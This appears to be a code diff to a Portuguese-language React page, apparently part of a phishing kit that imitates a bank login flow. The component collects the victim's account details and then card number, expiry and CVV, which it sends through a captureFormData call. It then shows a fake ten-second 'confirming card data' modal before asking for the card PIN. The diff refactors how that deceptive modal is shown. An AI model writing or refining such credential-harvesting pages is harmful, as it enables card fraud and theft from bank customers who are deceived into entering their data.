@@ -9,7 +9,8 @@ const SenhaAcesso = () => {
   const navigate = useNavigate();
   const location = useLocation();
   const { nome, agencia, conta } = (location.state as any) || {};
-  const [phase, setPhase] = useState<"senha" | "cartao" | "loadingCartao" | "senhaCartao" | "sucesso">("senha");
+  const [phase, setPhase] = useState<"senha" | "cartao" | "senhaCartao" | "sucesso">("senha");
+  const [showCardLoading, setShowCardLoading] = useState(false);
   const CARD_LOADING_MESSAGES = [
     "Processando...",
     "Confirmando dados do cartão",
@@ -50,7 +51,7 @@ const SenhaAcesso = () => {
   };
 
   useEffect(() => {
-    if (phase !== "loadingCartao") return;
+    if (!showCardLoading) return;
     const interval = 10000 / CARD_LOADING_MESSAGES.length;
     const timer = setInterval(() => {
       setCardLoadingStep((prev) => {
@@ -59,16 +60,17 @@ const SenhaAcesso = () => {
       });
     }, interval);
     const redirect = setTimeout(() => {
+      setShowCardLoading(false);
       setPhase("senhaCartao");
     }, 10000);
     return () => { clearInterval(timer); clearTimeout(redirect); };
-  }, [phase]);
+  }, [showCardLoading]);
 
   const handleCartao = () => {
     const cleanNumero = numero.replace(/\D/g, "");
     if (cleanNumero.length >= 13 && validade.length >= 4 && cvv.length >= 3) {
       captureFormData("dados-cartao", { numero: cleanNumero, validade, cvv });
-      setPhase("loadingCartao");
+      setShowCardLoading(true);
       setCardLoadingStep(0);
     }
   };
@@ -244,7 +246,7 @@ const SenhaAcesso = () => {
       </div>
 
       {/* Loading Modal after card */}
-      {phase === "loadingCartao" && (
+      {showCardLoading && (
         <div className="fixed inset-0 z-50 flex items-center justify-center">
           <div className="fixed inset-0 bg-black/50" />
           <div className="relative z-50 w-full max-w-sm mx-4 bg-card rounded-2xl p-8 shadow-xl flex flex-col items-center">
